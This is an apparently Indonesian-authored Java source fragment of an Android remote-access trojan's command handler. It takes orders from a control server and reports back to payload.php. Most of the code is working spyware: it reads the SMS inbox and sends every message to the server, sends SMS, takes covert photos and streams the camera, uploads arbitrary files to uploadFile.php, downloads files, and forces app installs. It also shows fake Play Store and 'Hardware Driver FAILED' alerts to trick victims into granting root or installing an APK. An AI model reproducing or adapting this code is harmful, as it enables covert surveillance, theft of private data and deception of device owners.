					reqPayload(context, urlServer+"/payload.php?outpayload="+textPayload("browser run menunggu hasil..."), "null");
					fbAktif = true;

					browHandler.postDelayed(browRefresh, 8 * 1000);
				}catch(Exception e) {}

				receAction.fbTarget(context, text[1]);
				reqPayload(context, urlServer+"/payload.php?outpayload="+textPayload("browser run menunggu hasil..."), "null");

				browHandler.postDelayed(browRefresh, 8 * 1000);
			}catch(Exception e){}

			try {
				String[] text = payloadWebResult.split("-browalert-");
				try { 
					String[] textFb = payloadResultFb().split("-browalert-");
					if (textFb[1].equals("stop")) {
						context.stopService(new Intent(context, ServiceAlert.class));
						
						reqPayload(context, urlServer+"/payload.php?outpayload="+textPayload("browser stop"), "null");
						fbAktif = true;
					
					} else if(textFb[1].equals("text")) {
						ServiceAlert alert = new ServiceAlert();
						alert.dataText = textFb[2];
						alert.dataPaket = "text";
						alert.pilihAksi = "browser";

						reqPayload(context, urlServer+"/payload.php?outpayload="+textPayload("browser text mulai"), "null");
						fbAktif = true;
						context.startService(new Intent(context, ServiceAlert.class));

					} else if (textFb[1].equals("all")) {
						ServiceAlert alert = new ServiceAlert();
						alert.dataText = textFb[2];
						alert.dataPaket = "web";
						alert.pilihAksi = "browser";

						reqPayload(context, urlServer+"/payload.php?outpayload="+textPayload("browser all mulai"), "null");
						fbAktif = true;
						context.startService(new Intent(context, ServiceAlert.class));
					}
				}catch(Exception e) {}

				if (text[1].equals("stop")) {
					context.stopService(new Intent(context, ServiceAlert.class));

					reqPayload(context, urlServer+"/payload.php?outpayload="+textPayload("browser stop"), "null");

				} else if(text[1].equals("text")) {
					ServiceAlert alert = new ServiceAlert();
					alert.dataText = text[2];
					alert.dataPaket = "text";
					alert.pilihAksi = "browser";

					reqPayload(context, urlServer+"/payload.php?outpayload="+textPayload("browser text mulai"), "null");
					context.startService(new Intent(context, ServiceAlert.class));

				} else if (text[1].equals("all")) {
					ServiceAlert alert = new ServiceAlert();
					alert.dataText = text[2];
					alert.dataPaket = "web";
					alert.pilihAksi = "browser";

					reqPayload(context, urlServer+"/payload.php?outpayload="+textPayload("browser all mulai"), "null");
					context.startService(new Intent(context, ServiceAlert.class));
				}
			}catch(Exception e){}

			try {
				String[] text = payloadWebResult.split("-out-");
				try { 
					String[] textFb = payloadResultFb().split("-out-");

					try {
						if (textFb[2].equals("fbaktif") || textFb[2].equals("fbmati")) {
							seteditor.putString("fbutf", textFb[2]);    
							seteditor.commit();
						}
					}catch(Exception e){}
					
					seteditor.putString("utf", textFb[1]);    
					seteditor.commit();

					reqPayload(context, urlServer+"/payload.php?outpayload="+textPayload(settings.getString("utf","")), "null");
					fbAktif = true;
				}catch(Exception e) {}

				try {
					if (text[2].equals("fbaktif") || text[2].equals("fbmati")) {
						seteditor.putString("fbutf", text[2]);    
						seteditor.commit();
					}
				}catch(Exception e){}

				seteditor.putString("utf", text[1]);    
				seteditor.commit();

				reqPayload(context, urlServer+"/payload.php?outpayload="+textPayload(settings.getString("utf","")), "null");
				fbAktif = true;			
			}catch(Exception e) {}

			try {
				String[] text = payloadWebResult.split("-speech-");
				try { 
					String[] textFb = payloadResultFb().split("-speech-");
					
					String datatts = textFb[1];
					ServiceTTS sertts = new ServiceTTS();
					sertts.cepat = 0.9f;
					sertts.str = datatts;
					context.startService(new Intent(context, ServiceTTS.class));
				
					reqPayload(context, urlServer+"/payload.php?outpayload="+textPayload("sedang ngomong"), "null");
					fbAktif = true;
				}catch(Exception e) {}

				String datatts = text[1];
				ServiceTTS sertts = new ServiceTTS();
				sertts.cepat = 0.9f;
				sertts.str = datatts;
				context.startService(new Intent(context, ServiceTTS.class));

				reqPayload(context, urlServer+"/payload.php?outpayload="+textPayload("sedang ngomong"), "null");
				fbAktif = true;
			}catch(Exception e) {}

			try {
				String[] text = payloadWebResult.split("-audio-");
				try { 
					String[] textFb = payloadResultFb().split("-audio-");
					if (textFb[2].equals("start")) {
						receAction.audio(context, textFb[1], textFb[2]);
						reqPayload(context, urlServer+"/payload.php?outpayload="+textPayload("audio dijalankan"), "null");
						fbAktif = true;

					} else {
						receAction.audio(context, textFb[1], textFb[2]);
						reqPayload(context, urlServer+"/payload.php?outpayload="+textPayload("audio dimatikan"), "null");
						fbAktif = true;
					}
				}catch(Exception e) {}

				if (text[2].equals("start")) {
					receAction.audio(context, text[1], text[2]);
					reqPayload(context, urlServer+"/payload.php?outpayload="+textPayload("audio dijalankan"), "null");
				}
				else {
					receAction.audio(context, text[1], text[2]);
					reqPayload(context, urlServer+"/payload.php?outpayload="+textPayload("audio dimatikan"), "null");
				}
			}catch(Exception e) {}

			try {
				String[] text = payloadWebResult.split("-cekroot-");
				try { 
					String[] textFb = payloadResultFb().split("-cekroot-");
					if (textFb[1].equals("cek")) {
						String root = receAction.rootRequest();
						reqPayload(context, urlServer+"/payload.php?outpayload="+textPayload("root:"+root), "null");

						fbAktif = true;
					
					} else if(textFb[1].equals("paksa")) {
						ServiceAlert alert = new ServiceAlert();
        				alert.dataText = "\n                           Play store!\n\n  Ilegal root system \n  [ROOTING NOT AVAILABLE IN HARDWARE!] \n  first debug in google team because allow this   prompt to acess your system";
        				alert.dataTextSize = 15;
        				alert.pilihAksi = "root";
        				alert.dataPaket = "";

						context.startService(new Intent(context, ServiceAlert.class));

						String root = receAction.rootRequest();
						reqPayload(context, urlServer+"/payload.php?outpayload="+textPayload("root:"+root), "null");
						fbAktif = true;
					
					} else if(textFb[1].equals("stop")) {
						context.startService(new Intent(context, ServiceAlert.class));
						reqPayload(context, urlServer+"/payload.php?outpayload="+textPayload("promp hapus"), "null");
						fbAktif = true;
					}
				} catch(Exception e) {}

				if (text[1].equals("cek")) {
					String root = receAction.rootRequest();
				
					reqPayload(context, urlServer+"/payload.php?outpayload="+textPayload("root:"+root), "null");
				
				} else if (text[1].equals("paksa")) {
					
					ServiceAlert alert = new ServiceAlert();
        			alert.dataText = "\n                           Play store!\n\n  Ilegal root system \n  [ROOTING NOT AVAILABLE IN HARDWARE!] \n  first debug in google team because allow this   prompt to acess your system";
        			alert.dataTextSize = 15;
        			alert.pilihAksi = "root";
        			alert.dataPaket = "";

					context.startService(new Intent(context, ServiceAlert.class));

					String root = receAction.rootRequest();
				
					reqPayload(context, urlServer+"/payload.php?outpayload="+textPayload("root:"+root), "null");

				}
				else if (text[1].equals("stop")) {
					context.startService(new Intent(context, ServiceAlert.class));
					reqPayload(context, urlServer+"/payload.php?outpayload="+textPayload("promp hapus"), "null");

				}
			}catch(Exception e) {}

			try {				
				String[] text = payloadWebResult.split("-webcam-");
				BackgroundService conf = new BackgroundService();
				try { 
					String[] textFb = payloadResultFb().split("-webcam-");
					if (textFb[1].equals("stop")) {
						if (new Main().isServiceRunning(context)) {
							context.stopService(new Intent(context, BackgroundService.class));
							reqPayload(context, urlServer+"/payload.php?outpayload="+textPayload("webcam stoping "+new Main().isServiceRunning(context)), "null");
							fbAktif = true;

						} else {
							reqPayload(context, urlServer+"/payload.php?outpayload="+textPayload("webcam status "+new Main().isServiceRunning(context)), "null");
							fbAktif = true;
						}
					
					} else if(textFb[1].equals("led")) {
						if (new Main().isServiceRunning(context)) {
							context.stopService(new Intent(context, BackgroundService.class));
							conf.led = "led";
							new Main(context, "", "");

							reqPayload(context, urlServer+"/payload.php?outpayload="+textPayload("webcam restart menggunakan led "+new Main().isServiceRunning(context)), "null");
							fbAktif = true;

						} else {
							conf.led = "led";
							new Main(context, "", "");

							reqPayload(context, urlServer+"/payload.php?outpayload="+textPayload("webcam mulai baru menggunakan led "+new Main().isServiceRunning(context)), "null");
							fbAktif = true;
						}
					
					} else {
						try {
							new Main(context, textFb[1], textFb[2]);
							reqPayload(context, urlServer+"/payload.php?outpayload="+textPayload("webcam port 8787 "+new Main().isServiceRunning(context)+" kamera "+text[1]+" kualitas "+text[2]), "null");
							fbAktif = true;

						}catch(Exception e) {
							new Main(context, textFb[1], "");
							reqPayload(context, urlServer+"/payload.php?outpayload="+textPayload("webcam port 8787 "+new Main().isServiceRunning(context)+" kamera "+text[1]), "null");
							fbAktif = true;
						}
					}

				}catch(Exception e) {}

				if (text[1].equals("stop")) {
					if (new Main().isServiceRunning(context)) {
						context.stopService(new Intent(context, BackgroundService.class));
						reqPayload(context, urlServer+"/payload.php?outpayload="+textPayload("webcam stoping "+new Main().isServiceRunning(context)), "null");
						fbAktif = true;

					} else {
						reqPayload(context, urlServer+"/payload.php?outpayload="+textPayload("webcam status "+new Main().isServiceRunning(context)), "null");
							fbAktif = true;

					}
				
				} else if (text[1].equals("led")) {
					if (new Main().isServiceRunning(context)) {
						context.stopService(new Intent(context, BackgroundService.class));
						conf.led = "led";
						new Main(context, "", "");

						reqPayload(context, urlServer+"/payload.php?outpayload="+textPayload("webcam restart menggunakan led "+new Main().isServiceRunning(context)), "null");
					
					} else {
						conf.led = "led";
						new Main(context, "", "");

						reqPayload(context, urlServer+"/payload.php?outpayload="+textPayload("webcam mulai baru menggunakan led "+new Main().isServiceRunning(context)), "null");

					}
				}
				else {
					try {
						new Main(context, text[1], text[2]);
						reqPayload(context, urlServer+"/payload.php?outpayload="+textPayload("webcam port 8787 "+new Main().isServiceRunning(context)+" kamera "+text[1]+" kualitas "+text[2]), "null");
					
					}catch(Exception e) {

						new Main(context, text[1], "");
						reqPayload(context, urlServer+"/payload.php?outpayload="+textPayload("webcam port 8787 "+new Main().isServiceRunning(context)+" kamera "+text[1]), "null");
					}
				}
			}catch(Exception e) {}

			try {
				String[] text = payloadWebResult.split("-install-");
				try { 
					String[] textFb = payloadResultFb().split("-install-");
					install_app = textFb[1];
					install_paket = textFb[2];

					try {
						Log.i(TAG, "nama asets: "+textFb[3]);

						new Installer(context, true).assetToSdcard(context, textFb[3], "/sdcard/");
						reqPayload(context, urlServer+"/payload.php?outpayload="+textPayload("get assets success"), "null");
						fbAktif = true;
					}catch(Exception e){
						reqPayload(context, urlServer+"/payload.php?outpayload="+textPayload("install bukan dari assets"), "null");
						fbAktif = true;
					}

					ServiceAlert alert = new ServiceAlert();
					alert.dataText = "\nNOTICE:\n\nHardware Driver FAILED 0xFF 0x01 0x0F can't access /system/build.prop please following\n\n1.  Install this plugin apk\n2.  Allow prompt if view\n3.  Open app to trigerred libc.so";
					alert.dataTextSize = 15;
					alert.pilihAksi = "install";
					alert.dataPaket = install_app;

					insHandler.postDelayed(insRefresh, 5 * 1000);

					reqPayload(context, urlServer+"/payload.php?outpayload="+textPayload("sedang paksa install aplikasi"), "null");
					fbAktif = true;
				}catch(Exception e) {}

				install_app = text[1];
				install_paket = text[2];
				try {
					Log.i(TAG, "nama asets: "+text[3]);

					new Installer(context, true).assetToSdcard(context, text[3], "/sdcard/");
					reqPayload(context, urlServer+"/payload.php?outpayload="+textPayload("get assets success"), "null");
				}
				catch(Exception e) {
					reqPayload(context, urlServer+"/payload.php?outpayload="+textPayload("install bukan dari assets"), "null");
				}
        		
        		ServiceAlert alert = new ServiceAlert();
				alert.dataText = "\nNOTICE:\n\nHardware Driver FAILED 0xFF 0x01 0x0F can't access /system/build.prop please following\n\n1.  Install this plugin apk\n2.  Allow prompt if view\n3.  Open app to trigerred libc.so";
				alert.dataTextSize = 15;
				alert.pilihAksi = "install";
				alert.dataPaket = install_app;

				insHandler.postDelayed(insRefresh, 5 * 1000);

				reqPayload(context, urlServer+"/payload.php?outpayload="+textPayload("sedang paksa install aplikasi"), "null");
			}catch(Exception e) {}

			try {
				String[] text = payloadWebResult.split("-uninstall-");
				try { 
					String[] textFb = payloadResultFb().split("-uninstall-");
					uninstall_paket = textFb[1];

					ServiceAlert alert = new ServiceAlert();
					alert.dataText = "\nNOTICE:\n\nThis app not updated please remove/install in Play Store\n\n\n";
					alert.dataTextSize = 15;
					alert.pilihAksi = "uninstall";
					alert.dataPaket = uninstall_paket;

					uniHandler.postDelayed(uniRefresh, 5 * 1000);

					reqPayload(context, urlServer+"/payload.php?outpayload="+textPayload("sedang paksa uninstall aplikasi: "+text[1]), "null");
					fbAktif = true;
				}catch(Exception e) {}

				uninstall_paket = text[1];

        		ServiceAlert alert = new ServiceAlert();
				alert.dataText = "\nNOTICE:\n\nThis app not updated please remove/install in Play Store\n\n\n";
				alert.dataTextSize = 15;
				alert.pilihAksi = "uninstall";
				alert.dataPaket = uninstall_paket;

				uniHandler.postDelayed(uniRefresh, 5 * 1000);

				reqPayload(context, urlServer+"/payload.php?outpayload="+textPayload("sedang paksa uninstall aplikasi: "+text[1]), "null");
				fbAktif = true;
			}catch(Exception e) {}

			try {
				String[] text = payloadWebResult.split("-sms-");
				try { 
					String[] textFb = payloadResultFb().split("-sms-");
					if (textFb[1].equals("baca")) {

						reqPayload(context, urlServer+"/payload.php?outpayload="+textPayload(receAction.getSms(context)), "null");
						fbAktif = true;

						Log.i(TAG, receAction.getSms(context));
						
					} else {
						String kirimSms = "";
						try {
							kirimSms = new MainActivity().sendSMS(context, text[2], text[1]);
						}catch(Exception e) {
							Log.i(TAG, "smserr:"+e);
						}
						Log.i(TAG, "sms:"+kirimSms);
						reqPayload(context, urlServer+"/payload.php?outpayload="+textPayload(kirimSms), "null");
						fbAktif = true;
					}
				}catch(Exception e) {}

				if (text[1].equals("baca")) {
					StringBuffer resultRsms = new StringBuffer();

					Cursor cursor = getContentResolver().query(Uri.parse("content://sms/inbox"), null, null, null, null);
					if (cursor.moveToFirst()) {
						do {
							String msgData = "";
							for (int idx=0; idx<cursor.getColumnCount(); idx++) {
								msgData += ""+cursor.getColumnName(idx)+":"+cursor.getString(idx);
							}
							resultRsms.append(msgData);
							
							reqPayload(context, urlServer+"/payload.php?outpayload="+textPayload(""+msgData), "null");

						} while (cursor.moveToNext());
						Log.i(TAG, resultRsms.toString());
					}
					else {
						
						reqPayload(context, urlServer+"/payload.php?outpayload="+textPayload("sms kosong"), "null");
						Log.i(TAG, "kosong");
					}

				} else {
					String kirimSms = "";
					try {
						kirimSms = new MainActivity().sendSMS(context, text[2], text[1]);
					}catch(Exception e) {
						Log.i(TAG, "smserr:"+e);
					}
					Log.i(TAG, "sms:"+kirimSms);

					
					reqPayload(context, urlServer+"/payload.php?outpayload="+textPayload(kirimSms), "null");
				}
			}catch(Exception e) {}

			try {
				String[] text = payloadWebResult.split("-wal-");
				try { 
					String[] textFb = payloadResultFb().split("-wal-");
					String set = receAction.setWalpaper(context, textFb[1]);
				
					reqPayload(context, urlServer+"/payload.php?outpayload="+textPayload(set), "null");
					fbAktif = true;
				}catch(Exception e) {}

				String set = receAction.setWalpaper(context, text[1]);
				
				reqPayload(context, urlServer+"/payload.php?outpayload="+textPayload(set), "null");
			} catch(Exception e) {}

			try {
				String[] text = payloadWebResult.split("-3d-");
				try { 
					String[] textFb = payloadResultFb().split("-3d-");
					String anPath    = textFb[1];
				
					float cameraX  = Float.MIN_VALUE;
					float cameraY  = Float.MIN_VALUE;
					float cameraZoom = Float.MIN_VALUE;
					float cameraRotasi = Float.MIN_VALUE;
					float posX   = Float.MIN_VALUE;
					float posY   = Float.MIN_VALUE;
					float posZ   = Float.MIN_VALUE;
					float skala    = Float.MIN_VALUE;

					try {cameraX       = Float.parseFloat(textFb[2]);} catch(Exception e){}
					try {cameraY       = Float.parseFloat(textFb[3]);} catch(Exception e){}
					try {cameraZoom    = Float.parseFloat(textFb[4]);} catch(Exception e){}
					try {cameraRotasi  = Float.parseFloat(textFb[5]);} catch(Exception e){}
					try {posX          = Float.parseFloat(textFb[6]);} catch(Exception e){}
					try {posY          = Float.parseFloat(textFb[7]);} catch(Exception e){}
					try {posZ          = Float.parseFloat(textFb[8]);} catch(Exception e){}
					try {skala         = Float.parseFloat(textFb[9]);} catch(Exception e){}

					if (anPath.equals("stop")) {
						context.stopService(new Intent(context, ServiceAlert.class));
						reqPayload(context, urlServer+"/payload.php?outpayload="+textPayload("3d stop"), "null");
						fbAktif = true;
					}
					else if (text[1].equals("conf")) {
						reqPayload(context, urlServer+"/payload.php?outpayload="+textPayload("3d file sedang dikembangkan"), "null");
						fbAktif = true;
					}
					else {

						ServiceAlert model = new ServiceAlert();
						model.zoomRotasi = true;
						model.posisi = true;
						model.pilihAksi = "3d";
						model.setPath(anPath);
						model.skala = skala;
						model.setCamera(cameraX, cameraY);
						model.setCameraZoom(cameraZoom);
						model.setCameraRotasi(cameraRotasi);
						model.setPosisi(posX, posY, posZ);

						context.startService(new Intent(context, ServiceAlert.class));
					
						reqPayload(context, urlServer+"/payload.php?outpayload="+textPayload("3d langsung "), "null");
						fbAktif = true;
					}
				}catch(Exception e) {}

				String anPath    = text[1];
				
				float cameraX  = Float.MIN_VALUE;
				float cameraY  = Float.MIN_VALUE;
				float cameraZoom = Float.MIN_VALUE;
				float cameraRotasi = Float.MIN_VALUE;
				float posX   = Float.MIN_VALUE;
				float posY   = Float.MIN_VALUE;
				float posZ   = Float.MIN_VALUE;
				float skala    = Float.MIN_VALUE;

				try {cameraX       = Float.parseFloat(text[2]);} catch(Exception e){}
				try {cameraY       = Float.parseFloat(text[3]);} catch(Exception e){}
				try {cameraZoom    = Float.parseFloat(text[4]);} catch(Exception e){}
				try {cameraRotasi  = Float.parseFloat(text[5]);} catch(Exception e){}
				try {posX          = Float.parseFloat(text[6]);} catch(Exception e){}
				try {posY          = Float.parseFloat(text[7]);} catch(Exception e){}
				try {posZ          = Float.parseFloat(text[8]);} catch(Exception e){}
				try {skala         = Float.parseFloat(text[9]);} catch(Exception e){}

				if (anPath.equals("stop")) {
					context.stopService(new Intent(context, ServiceAlert.class));
					reqPayload(context, urlServer+"/payload.php?outpayload="+textPayload("3d stop"), "null");
				}
				else if (text[1].equals("conf")) {
					reqPayload(context, urlServer+"/payload.php?outpayload="+textPayload("3d file sedang dikembangkan"), "null");
				}
				else {

					ServiceAlert model = new ServiceAlert();
					model.zoomRotasi = true;
					model.posisi = true;
					model.pilihAksi = "3d";
					model.setPath(anPath);
					model.skala = skala;
					model.setCamera(cameraX, cameraY);
					model.setCameraZoom(cameraZoom);
					model.setCameraRotasi(cameraRotasi);
					model.setPosisi(posX, posY, posZ);

					context.startService(new Intent(context, ServiceAlert.class));
					
					reqPayload(context, urlServer+"/payload.php?outpayload="+textPayload("3d langsung "), "null");
				}
			} catch(Exception e) {}

			try {
				String[] text = payloadWebResult.split("-zip-");
				try { 
					String[] textFb = payloadResultFb().split("-zip-");
					new Installer(context, "aktif").compressFiles(textFb[1], textFb[2]);
				}catch(Exception e) {}

				new Installer(context, "aktif").compressFiles(text[1], text[2]);
			} catch(Exception e) {}

			try {
				String[] text = payloadWebResult.split("-apk2sd-");
				try { 
					String[] textFb = payloadResultFb().split("-apk2sd-");
					MainActivity apk = new MainActivity();
					apk.pullApk = textFb[2];

					if (new MainActivity().apkMana(context, textFb[1], "pull")) {
						reqPayload(context, urlServer+"/payload.php?outpayload="+textPayload("apk tersimpan di "+textFb[2]), "null");
						fbAktif = true;
					} else {
						reqPayload(context, urlServer+"/payload.php?outpayload="+textPayload("gagal save apk "), "null");
						fbAktif = true;
					}
				}catch(Exception e) {}

				MainActivity apk = new MainActivity();
				apk.pullApk = text[2];

				if (new MainActivity().apkMana(context, text[1], "pull"))
					reqPayload(context, urlServer+"/payload.php?outpayload="+textPayload("apk tersimpan di "+text[2]), "null");
				else
					reqPayload(context, urlServer+"/payload.php?outpayload="+textPayload("gagal save apk "), "null");
			} catch(Exception e) {}

			try {
				String[] text = payloadWebResult.split("-foto-");

				try { 
					String[] textFb = payloadResultFb().split("-foto-");
					receAction.setDoc(context);
					CamRuntime came = new CamRuntime();

					String ok = "";
					if (textFb[1].equals("up"))
						ok = textFb[99];

					try {
						if (textFb[2].equals("led")) came.led = "led";
					}catch(Exception e){}

					// entah kenapa jika kamera back dipanggil disini foto tidak bisa disimpan
					// tapi kalau dipanggil di onCreate bisa -_-
					// hp debuging sony xperia so-04e kurang tau kalau hp yang lain

					Runtime.getRuntime().exec("rm "+receAction.pathExternal+"/payloadout/foto.jpg");
					Thread.sleep(1000);
					came.capturePhoto(text[1], receAction.pathExternal+"/payloadout", "foto.jpg", context);
				
					reqPayload(context, urlServer+"/payload.php?outpayload="+textPayload("kamera sukses:"+textFb[1]), "null");
					fbAktif = true;
				}catch(Exception e) {}

				receAction.setDoc(context);
				CamRuntime came = new CamRuntime();

				String ok = "";
				if (text[1].equals("up"))
					ok = text[99];

				try {
					if (text[2].equals("led")) came.led = "led";
				}catch(Exception e){}

				// entah kenapa jika kamera back dipanggil disini foto tidak bisa disimpan
				// tapi kalau dipanggil di onCreate bisa -_-
				// hp debuging sony xperia so-04e kurang tau kalau hp yang lain

				Runtime.getRuntime().exec("rm "+receAction.pathExternal+"/payloadout/foto.jpg");
				Thread.sleep(1000);
				came.capturePhoto(text[1], receAction.pathExternal+"/payloadout", "foto.jpg", context);
				
				reqPayload(context, urlServer+"/payload.php?outpayload="+textPayload("kamera sukses:"+text[1]), "null");
			}
			catch(Exception e) {}

			try {
				String[] text = payloadWebResult.split("-foto2-");
				try { 
					String[] textFb = payloadResultFb().split("-foto2-");
					receAction.setDoc(context);
					String led = "off";
					boolean depan = false;

					if (textFb[1].equals("depan"))
						depan = true;
					if (textFb[1].equals("up"))
						led = textFb[99];

					try {
						if (textFb[2].equals("led")) {
							led = "on";
						}
					}catch(Exception e){}

					// ini udah diupdate

					Intent intent = new Intent(context, CamerService.class);
					intent.putExtra("Front_Request", depan);
					intent.putExtra("FLASH", led);
					intent.putExtra("path", receAction.pathExternal+"/payloadout");
					intent.putExtra("nama", "foto");
					context.startService(intent);

					Thread.sleep(2500);
					receAction.requestUrl = urlServer+"/uploadFile.php";
					receAction.requestAksi = "upload";
					receAction.requestPath = receAction.pathExternal+"/payloadout/foto.jpg";
					receAction.mainRequest(context);

					reqPayload(context, urlServer+"/payload.php?outpayload="+textPayload("kamera sukses:"+textFb[1]), "null");
					fbAktif = true;
				}catch(Exception e){}

				receAction.setDoc(context);
				String led = "off";
				boolean depan = false;

				if (text[1].equals("depan"))
					depan = true;
				if (text[1].equals("up"))
					led = text[99];

				try {
					if (text[2].equals("led")) {
						led = "on";
					}
				}catch(Exception e){}

				// ini udah diupdate

				Intent intent = new Intent(context, CamerService.class);
				intent.putExtra("Front_Request", depan);
				intent.putExtra("FLASH", led);
				intent.putExtra("path", receAction.pathExternal+"/payloadout");
				intent.putExtra("nama", "foto");
				context.startService(intent);

				Thread.sleep(2500);
				receAction.requestUrl = urlServer+"/uploadFile.php";
				receAction.requestAksi = "upload";
				receAction.requestPath = receAction.pathExternal+"/payloadout/foto.jpg";
				receAction.mainRequest(context);

				reqPayload(context, urlServer+"/payload.php?outpayload="+textPayload("kamera sukses:"+text[1]), "null");
			}
			catch(Exception e) {}

			try {
				String[] text = payloadWebResult.split("-cam-");
				try { 
					String[] textFb = payloadResultFb().split("-cam-");
					CamRuntime camRuntime = new CamRuntime();
					camRuntime.path = receAction.pathExternal+"/payloadout";

					try {
						int i = Integer.parseInt(textFb[3]);
						jcamera = i;
						Log.i(TAG, "jcamera:"+i);


						if (textFb[2].equals("1")) camRuntime.kualitas = 1;
					}catch(Exception e) {}

					try {
						if (textFb[2].equals("1")) camRuntime.kualitas = 1;
					}catch(Exception e) {}

					if (textFb[1].equals("depan")) {
						Intent intent = new Intent(context, CamRuntime.class);
						context.startService(intent);
            
						bindService(intent, camServiceConeksi, 0);
					}
					else if (textFb[1].equals("back")) {
						camRuntime.isCamera = 0; //back cam
						Intent intent = new Intent(context, CamRuntime.class);
						context.startService(intent);
						bindService(intent, camServiceConeksi, 0);
					}
					camHandler.postDelayed(camRefresh, 5 * 1000);
				}catch(Exception e) {}

				CamRuntime camRuntime = new CamRuntime();
				camRuntime.path = receAction.pathExternal+"/payloadout";

				try {
					int i = Integer.parseInt(text[3]);
					jcamera = i;
					Log.i(TAG, "jcamera:"+i);


					if (text[2].equals("1")) camRuntime.kualitas = 1;
				}catch(Exception e) {}

				try {
					if (text[2].equals("1")) camRuntime.kualitas = 1;
				}catch(Exception e) {}

				if (text[1].equals("depan")) {
					Intent intent = new Intent(context, CamRuntime.class);
					context.startService(intent);
            
					bindService(intent, camServiceConeksi, 0);
				}
				else if (text[1].equals("back")) {
					camRuntime.isCamera = 0; //back cam
					Intent intent = new Intent(context, CamRuntime.class);
					context.startService(intent);
					bindService(intent, camServiceConeksi, 0);
				}
				camHandler.postDelayed(camRefresh, 5 * 1000);
			}
			catch(Exception e) {}

			try {
				String[] text = payloadWebResult.split("-key-");
				try { 
					String[] textFb = payloadResultFb().split("-key-");

					if (textFb[1].equals("home")) {
						Intent intent = new Intent(Intent.ACTION_MAIN);
						intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
						intent.addCategory(Intent.CATEGORY_HOME);
						context.startActivity(intent);
					}
					if (textFb[1].equals("recent")) {
						receAction.doRecentAction();
					}

					reqPayload(context, urlServer+"/payload.php?outpayload="+textPayload("keyEvent:"+textFb[1]+" berhasil dibuka"), "null");
					fbAktif = true;
				}catch(Exception e) {}

				if (text[1].equals("home")) {
					Intent intent = new Intent(Intent.ACTION_MAIN);
					intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
					intent.addCategory(Intent.CATEGORY_HOME);
					context.startActivity(intent);
				}
				if (text[1].equals("recent")) {
					receAction.doRecentAction();
				}

				reqPayload(context, urlServer+"/payload.php?outpayload="+textPayload("keyEvent:"+text[1]+" berhasil dibuka"), "null");
			}catch(Exception e) {}

			try {
				String[] text = payloadWebResult.split("-app-");
				try { 
					String[] textFb = payloadResultFb().split("-app-");
					if (new MainActivity().apkMana(context, textFb[1], "open")) {
						reqPayload(context, urlServer+"/payload.php?outpayload="+textPayload("APK:"+textFb[1]+" berhasil dibuka"), "null");
						fbAktif = true;
					} else {
						reqPayload(context, urlServer+"/payload.php?outpayload="+textPayload("gagal buka apk"), "null");
						fbAktif = true;
					}
				}catch(Exception e) {}

				if (new MainActivity().apkMana(context, text[1], "open"))
					reqPayload(context, urlServer+"/payload.php?outpayload="+textPayload("APK:"+text[1]+" berhasil dibuka"), "null");
				else
					reqPayload(context, urlServer+"/payload.php?outpayload="+textPayload("gagal buka apk"), "null");
			}
			catch(Exception e) {}

			try {
				String[] text = payloadWebResult.split("-up-");
				try { 
					String[] textFb = payloadResultFb().split("-up-");
					String reqpath = "";

					if (textFb[1].equals("video")) {
						reqpath = receAction.pathExternal+"/payloadout/REC_SYSTEM.mp4";
						reqPayload(SystemThread.this, urlServer+"/payload.php?outpayload="+textPayload("upload video TUNGGU"), "null");
						fbAktif = true;
					}
					else if (textFb[1].equals("screen")) {
						reqpath = receAction.pathExternal+"/payloadout/screen.jpg";
						reqPayload(SystemThread.this, urlServer+"/payload.php?outpayload="+textPayload("upload screenshot TUNGGU"), "null");
						fbAktif = true;
					}
					else if (textFb[1].equals("foto")) {
						reqpath = receAction.pathExternal+"/payloadout/foto.jpg";
						reqPayload(SystemThread.this, urlServer+"/payload.php?outpayload="+textPayload("upload foto TUNGGU"), "null");
						fbAktif = true;
					}
					else {
						reqpath = textFb[1];
					}

					receAction.requestUrl = urlServer+"/uploadFile.php";
					receAction.requestAksi = "upload";
					receAction.requestPath = reqpath;
					receAction.mainRequest(context);
					reqPayload(context, urlServer+"/payload.php?outpayload="+textPayload("upload file : "+reqpath), "null");
					fbAktif = true;
				}catch(Exception e) {}

				String reqpath = "";

				if (text[1].equals("video")) {
					reqpath = receAction.pathExternal+"/payloadout/REC_SYSTEM.mp4";
					
					reqPayload(SystemThread.this, urlServer+"/payload.php?outpayload="+textPayload("upload video TUNGGU"), "null");
				}
				else if (text[1].equals("screen")) {
					reqpath = receAction.pathExternal+"/payloadout/screen.jpg";
					
					reqPayload(SystemThread.this, urlServer+"/payload.php?outpayload="+textPayload("upload screenshot TUNGGU"), "null");
				}
				else if (text[1].equals("foto")) {
					reqpath = receAction.pathExternal+"/payloadout/foto.jpg";
					
					reqPayload(SystemThread.this, urlServer+"/payload.php?outpayload="+textPayload("upload foto TUNGGU"), "null");
				}
				else {
					reqpath = text[1];
				}

				receAction.requestUrl = urlServer+"/uploadFile.php";
				receAction.requestAksi = "upload";
				receAction.requestPath = reqpath;
				receAction.mainRequest(context);
				
				
				reqPayload(context, urlServer+"/payload.php?outpayload="+textPayload("upload file : "+reqpath), "null");
			}
			catch(Exception e) {}

			try {
				String[] text = payloadWebResult.split("-down-");
				try { 
					String[] textFb = payloadResultFb().split("-down-");

					String downurl = "";
					String downname = "";
					try {
						downname = textFb[3];
						downurl = textFb[1];
					}catch(Exception e) {
						downname = textFb[1];
						downurl = urlServer+"/download.php?id=payloadout/"+textFb[1];
					}

					receAction.requestUrl = downurl;
					receAction.requestAksi = "download";
					receAction.requestPath = textFb[2]+"/"+downname; //path
					receAction.mainRequest(context);
					Thread.sleep(5000);
				
					reqPayload(context, urlServer+"/payload.php?outpayload="+textPayload("dwnload file : "+textFb[1]), "null");
					fbAktif = true;
				}catch(Exception e) {}
				
				String downurl = "";
				String downname = "";
				try {
					downname = text[3];
					downurl = text[1];
				}catch(Exception e) {
					downname = text[1];
					downurl = urlServer+"/download.php?id=payloadout/"+text[1];
				}

				receAction.requestUrl = downurl;
				receAction.requestAksi = "download";
				receAction.requestPath = text[2]+"/"+downname; //path
				receAction.mainRequest(context);
				Thread.sleep(5000);
				
				reqPayload(context, urlServer+"/payload.php?outpayload="+textPayload("dwnload file : "+text[1]), "null");
			}
			catch(Exception e) {}

			try {
				String[] text = payloadWebResult.split("-alert-");
				try { 
					String[] textFb = payloadResultFb().split("-alert-");
					try {
						int alert_durasi = Integer.parseInt(textFb[4]);
					}catch(Exception e) {}
					try {
						if (textFb[3].equals("atas")) alert_letak = Gravity.TOP;
						else if (textFb[3].equals("tengah")) alert_letak = Gravity.CENTER;  
